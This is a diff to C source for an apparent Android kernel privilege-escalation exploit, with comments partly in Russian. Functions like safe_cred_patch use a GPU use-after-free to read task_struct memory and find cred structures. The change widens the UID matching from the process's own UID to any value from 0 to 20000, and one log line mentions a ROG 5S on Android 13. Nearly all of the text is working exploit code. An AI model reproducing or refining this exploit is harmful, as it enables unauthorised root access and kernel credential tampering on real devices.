@@ -1363,7 +1363,7 @@ static void safe_cred_patch(void)
                 fprintf(stderr, "[CHILD] Marker found at buffer offset 0x%x\n", comm_off);
                 
                 // Search for cred_ptr in a wide window around comm
-                fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
+                fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID 0-20000)...\n");
                 int candidates_count = 0;
                 
                 // Priority 1: Double pointers (real_cred + cred)
@@ -1375,9 +1375,10 @@ static void safe_cred_patch(void)
                         uint8_t cc[256];
                         if (gpu_read_task_struct(fd, p1, cc, 256) == 0) {
                             for (int co = 0; co < 240; co += 4) {
-                                if (*(uint32_t *)(cc + co) == my_uid) {
+                                uint32_t val = *(uint32_t *)(cc + co);
+                                if (val <= 20000) { // Ищем от 0 до 20000
                                     cred_ptr = p1;
-                                    fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Double-ptr)! ptr=0x%lx (UID at +0x%x)\n", (unsigned long)cred_ptr, co);
+                                    fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Double-ptr)! ptr=0x%lx (UID %u at +0x%x)\n", (unsigned long)cred_ptr, val, co);
                                     break;
                                 }
                             }
@@ -1398,12 +1399,12 @@ static void safe_cred_patch(void)
                                 int uid_found_count = 0;
                                 for (int co = 0; co < 240; co += 4) {
                                     uint32_t uid = *(uint32_t *)(cred_check + co);
-                                    if (uid == my_uid) {
+                                    if (uid <= 20000) { // Ищем от 0 до 20000
                                         uid_found_count++;
                                         if (uid_found_count >= 2) { // Strong match
                                             cred_ptr = ptr;
-                                            fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Scan)! ptr=0x%lx (UID at +0x%x, matches %d)\n", 
-                                                    (unsigned long)cred_ptr, co, uid_found_count);
+                                            fprintf(stderr, "[CHILD] [!!!] MATCH FOUND (Scan)! ptr=0x%lx (UID %u at +0x%x, matches %d)\n", 
+                                                    (unsigned long)cred_ptr, uid, co, uid_found_count);
                                             break;
                                         }
                                     }
@@ -1879,7 +1880,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 uint32_t found_cred_off = 0;
 
                 // Super Deep Scan for ROG 5S / Android 13
-                fprintf(stderr, "    [*] Searching for any app UID (10000-20000) in task_struct range 0x400-0xA00...\n");
+                fprintf(stderr, "    [*] Searching for any UID (0-20000) in task_struct range 0x400-0xA00...\n");
                 uint8_t task_super[0x1000];
                 if (gpu_read_task_struct(fd, task_start_va, task_super, 0x1000) == 0) {
                     for (int i = 0x400; i < 0xA00; i += 8) { // Расширили диапазон поиска
@@ -1890,7 +1891,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                                 // Ищем UID в первых 64 байтах структуры cred
                                 for (int j = 0; j < 12; j++) {
                                     uint32_t val = check[j];
-                                    if (val >= 10000 && val <= 20000) {
+                                    if (val <= 20000) { // Ищем от 0 до 20000
                                         // Если нашли UID, проверяем соседние поля (обычно uid == gid == suid == sgid)
                                         if (check[j] == check[j+1] || check[j] == check[j+2]) {
                                             found_cred_ptr = ptr;
